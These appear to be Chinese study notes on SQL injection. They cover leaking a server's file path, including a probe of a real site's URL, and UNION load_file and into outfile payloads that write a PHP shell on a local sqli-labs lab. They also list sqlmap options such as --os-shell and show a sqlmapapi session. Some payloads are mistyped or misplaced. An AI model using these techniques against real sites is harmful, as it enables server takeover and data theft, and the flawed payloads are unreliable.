# 通过漏洞注入获取网站权限

## 一句话马

### 具有相关可运行环境

### 通过sql漏洞注入拿到webshell

> 使用条件

1. 木马上传成功

2. 木马路径
3. 上传的木马可以正常运行

> 通过sql注入获取对方服务器的权限，需满足条件

1. sql注入用户为dba权限（最高权限）

2. 知道网站绝对路径

   ```shell
   1.单引号爆路径：在网址中某个参数后加单引号
   2.错误参数值：在网址中将某个参数值改为位置参数
       #http://www.archcollege.com/admin.php?m=public&a=login%27 
       
       :(
   
       非法操作:login‘
       错误位置
       FILE: /data/projects/archcollege/codes/code_2018_11_20/Archcollege/ThinkPHP/Common/functions.php 　LINE: 125
   
       ThinkPHP3.1.3 { Fast & Simple OOP PHP Framework } -- [ WE CAN DO IT JUST THINK ]
   3.通过搜索引擎获取：site：xxx.com “fatal error”
   4.测试文件获取路径：使用集成化软件环境搭建网站，XAMPP,PHPStudy等，会遗留下测试文件test.php等
   5.配置文件获取路径：若注入点有文件读取权限，可通过load_file函数读取配置文件，从中寻路径信息
   	寻找默认文件路径进行尝试
   	c:\windows\php.ini
   	c:\windows\system32\insetsrv\MetaBase.xml
   	etc/php.ini
   6.mginx文件类型错误解析爆路径：要求web服务器是nginx，且存在文件类型解析漏洞，又是在图片地址后加/x.php，该图片不会当作php文件执行，且可能爆出路径
   7.通过phpmyadmin爆路径：/phpmyadmin/themes/darkblue_orange/layout.inc.php
   8.配合远程代码执行漏洞：eval()函数可控的话，传入phpinfo（），通过Document_Root，一句话马等
   ```

3. My.ini文件中secure_file_priv=""为空**(所有操作实现)**

4. 手工操作

    1. 读取文件load file();

       ```url
       http:/127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,load file('E:/phpstudy/PHPTutorial/www/sqi-labs-master/Less- 1/index.php”) %23
       ```

   ​	![image-20240927103706117](/typora-user-images/image-20240927103706117.png)

   2. 写入文件into outfile();

      ```url
      http:/127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,'<?php phpinfo();?>',3 into outfile 'E:/phpStudy/PHPTutorial/WW/sqli-labs-master/Less-1/ab.php' %23
      ```

### 通过phpmyadmin日志写入一句话马

> 使用条件

1. root权限的数据库用户
2. 网站的绝对路径（确认有写入权限）
3. secure_file_priv=""为空

> dnslogs盲注

```url
http:/127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,load file('E:/phpstudy/PHPTutorial/www/sqi-labs-master/Less- 1/index.php”) %23
```

## 工具-sqlmap

```shell
-h                  输出参数说明
-hh                 输出详细的参数说明
-v                  输出级别（0~6，默认1）
-u url              指定url
--data=DATA         该参数指定的数据会被作为POST数据提交
-r file.txt         常用于POST注入或表单提交时注入
-p / --skip         指定/跳过测试参数
--cookie            设置cookie
--force-ssl         强制使用SSL
--threads           指定线程并发数
--prefix            指定前缀
--suffix            指定后缀
--level             检测级别（1~5，默认1）
--risk              风险等级（1~4，默认1）
--all               列举所有可访问的数据（不推荐）
--banner            列举数据库系统的信息等
--current-user      输出当前用户
--current-db        输出当前所在数据库
--hostname          输出服务器主机名
--is-dba            检测当前用户是否为管理员
--users             输出数据库系统的所有用户
--dbs               输出数据库系统的所有数据库
-D DB               指定数据库
--tables            在-D情况下输出库中所有表名
-T table            在-D情况下指定数据表
--columns           在-D -T情况下输出表中所有列名
-C column           在-D -T情况下输出某列数据的值
--dump              拉取数据存放到本地
--dump-all          拉取所有可访问数据存放到本地
--count             输出数据条目数量
--search            搜索数据库名、表明、列名，需要与-D -T或-C 联用
--sql-query         执行任意的SQL语句
--sql-shell         使用交互式SQL语句执行环境
--flie-read         读取文件
--file-write        上传文件（指定本地路径）
--file-dest         上传文件（指定目标机器路径）
--os-cmd            执行任意系统命令
--os-shell          使用交互式shell执行命令
--batch             所有要求输入都选取默认值
--wizard            初学者向导
官方手册：https://github.com/sqlmapproject/sqlmap/wiki/Usage
```

### sqlmapapi

> sqlmap api 分为服务端和客户端分为两种模式，基于HTTP及命令行的接口模式

1. 使用sqlmapapi -s 开启服务

2. 连接方式

   ```shell
   #服务端开启
   #默认端口，使用和连接（只能本机连接使用）
   sqlmapapi -s 
   sqlmapapi -c
   #自己设置端口ip
   sqlmapapi -s -H "ip" -p （端口号）
   sqlmapapi -c -H "ip" -p （端口号）
   #连接后的选项说明
   ```

   ![image-20240929094436361](/typora-user-images/image-20240929094436361.png)

3. 开始扫描

```shell
api> new -u "http://127.0.0.1:81/Less-1/?id=1" #新建扫描任务
[09:47:54] [DEBUG] Calling 'http://127.0.0.1:8775/task/new'
[09:47:54] [INFO] New task ID is '594fe6c03b364b93'
[09:47:54] [DEBUG] Calling 'http://127.0.0.1:8775/scan/594fe6c03b364b93/start'
[09:47:54] [INFO] Scanning started
api (594fe6c03b364b93)> list					#查看扫描任务列表
[09:48:15] [DEBUG] Calling 'http://127.0.0.1:8775/admin/list'
{
    "success": true,
    "tasks": {
        "594fe6c03b364b93": "terminated" #查看扫描信息 terminated（扫描完成） running（正在扫描）
    },
    "tasks_num": 1
}
api (aed2210d8d5bdae0)> status				#查看扫描结果
[09:56:23] [DEBUG] Calling 'http://127.0.0.1:8775/scan/aed2210d8d5bdae0/status'
{
    "success": true,
    "status": "terminated",
    "returncode": 0
}
```

4. 判断是否存在注入

   ```shell
   api (aed2210d8d5bdae0)> data
   [09:53:06] [DEBUG] Calling 'http://127.0.0.1:8775/scan/aed2210d8d5bdae0/data'
   {
       "success": true,
       "data": [
           {
               "status": 1,
               "type": 0,
               "value": {
                   "url": "http://127.0.0.1:81/Less-1/",
                   "query": "id=1",
                   "data": null
               }
           },
           {
               "status": 1,
               "type": 1,
               "value": [
                   {
                       "place": "GET",
                       "parameter": "id",
                       "ptype": 2,
                       "prefix": "'",
                       "suffix": " AND '[37m[RANDSTR][0m'='[RANDSTR]",
                       "clause": [
                           1,
                           8,
                           9
                       ],
                       "notes": [],
                       "data": {				#查看此data处是否含有数据
                           "1": {
                               "title": "AND boolean-based blind - WHERE or HAVING clause",
                               "payload": "id=1' AND 1109=1109 AND '[37mmjKv[0m'='mjKv",
                               "where": 1,
                               "vector": "AND [INFERENCE]",
                               "comment": "",
                               "templatePayload": null,
                               "matchRatio": 0.957,
                               "trueCode": 200,
                               "falseCode": 200
                           },
   api (aed2210d8d5bdae0)> use （id号）		#切换另一个扫描任务id ，查看其扫描结果或信息
   ```

5. 查数据使用

   使用方式与正常的sqlmap使用相同

6. 使用sqlmapapi脚本进行批量使用

